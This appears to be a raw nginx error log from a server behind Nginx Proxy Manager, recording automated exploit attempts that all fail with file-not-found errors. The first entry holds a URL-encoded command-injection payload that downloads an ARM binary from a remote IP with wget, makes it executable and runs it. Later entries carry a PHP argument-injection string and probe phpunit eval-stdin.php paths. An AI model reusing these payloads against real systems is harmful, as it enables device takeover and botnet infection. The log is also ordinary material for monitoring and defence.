2026/04/27 15:31:10 [error] 200#200: *13 open() "/var/www/html/device.rsp" failed (2: No such file or directory), client: 176.65.140.78, server: localhost-nginx-proxy-manager, request: "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20xd.armv7l%3B%20wget%20http%3A%2F%2F212.192.12.168%3A8087%2Fxd.armv7l%3B%20chmod%20777%20%2A%3B%20.%2Fxd.armv7l%20tbk HTTP/1.1", host: "153.92.211.75:80"
2026/04/27 16:43:48 [error] 244#244: *417 open() "/var/www/html/hello.world" failed (2: No such file or directory), client: 15.204.116.85, server: localhost-nginx-proxy-manager, request: "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1", host: "153.92.211.75:80"
2026/04/27 16:43:48 [error] 244#244: *417 open() "/var/www/html/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 15.204.116.85, server: localhost-nginx-proxy-manager, request: "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "153.92.211.75:80"
2026/04/27 16:43:48 [error] 244#244: *417 open() "/var/www/html/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 15.204.116.85, server: localhost-nginx-proxy-manager, request: "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1", host: "153.92.211.75:80"
2026/04/27 16:43:49 [error] 244#244: *417 open() "/var/www/html/vendor/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 15.204.116.85, server: localhost-nginx-proxy-manager, request: "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "153.92.211.75:80"
2026/04/27 16:43:49 [error] 244#244: *417 open() "/var/www/html/vendor/phpunit/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 15.204.116.85, server: localhost-nginx-proxy-manager, request: "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1", host: "153.92.211.75:80"
2026/04/27 16:43:49 [error] 244#244: *417 open() "/var/www/html/vendor/phpunit/phpunit/LICENSE/eval-stdin.php" failed (2: No such file or directory), client: 15.204.116.85, server: localhost-nginx-proxy-manager, request: "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1", host: "153.92.211.75:80"
2026/04/27 16:43:50 [error] 244#244: *417 open() "/var/www/html/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 15.204.116.85, server: localhost-nginx-proxy-manager, request: "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "153.92.211.75:80"
2026/04/27 16:43:50 [error] 244#244: *417 open() "/var/www/html/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 15.204.116.85, server: localhost-nginx-proxy-manager, request: "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "153.92.211.75:80"
2026/04/27 16:43:50 [error] 244#244: *417 open() "/var/www/html/phpunit/phpunit/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 15.204.116.85, server: localhost-nginx-proxy-manager, request: "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1", host: "153.92.211.75:80"
2026/04/27 16:43:50 [error] 244#244: *417 open() "/var/www/html/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 15.204.116.85, server: localhost-nginx-proxy-manager, request: "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "153.92.211.75:80"
2026/04/27 16:43:50 [error] 244#244: *417 open() "/var/www/html/phpunit/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 15.204.116.85, server: localhost-nginx-proxy-manager, request: "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1", host: "153.92.211.75:80"
2026/04/27 16:43:50 [error] 244#244: *417 open() "/var/www/html/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 15.204.116.85, server: localhost-nginx-proxy-manager, request: "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "153.92.211.75:80"
